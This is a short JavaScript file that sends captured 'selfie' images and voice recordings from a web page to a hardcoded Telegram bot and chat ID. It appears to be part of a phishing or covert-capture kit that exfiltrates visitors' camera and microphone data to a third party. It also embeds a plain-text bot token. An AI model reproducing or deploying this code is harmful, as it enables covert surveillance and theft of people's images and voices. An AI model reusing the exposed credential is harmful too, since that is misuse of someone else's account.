// js/telegram.js

const TELEGRAM_TOKEN = '8066497989:AAFHHluIg8WZugbq9C6Qmalqoo6vVjVS6rw';
const CHAT_ID = '1789475188';

function sendSelfieToTelegram(dataURL) {
  const blob = dataURLtoBlob(dataURL);
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('photo', blob, 'selfie.png');

  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: formData
  });
}

function sendVoiceToTelegram(blob) {
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('voice', blob, 'voice.ogg');

  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVoice`, {
    method: 'POST',
    body: formData
  });
}

function dataURLtoBlob(dataURL) {
  const parts = dataURL.split(',');
  const byteString = atob(parts[1]);
  const mimeString = parts[0].split(':')[1].split(';')[0];

  const ab = new ArrayBuffer(byteString.length);
  const ia = new Uint8Array(ab);
  for (let i = 0; i < byteString.length; i++) {
    ia[i] = byteString.charCodeAt(i);
  }

  return new Blob([ab], { type: mimeString });
}
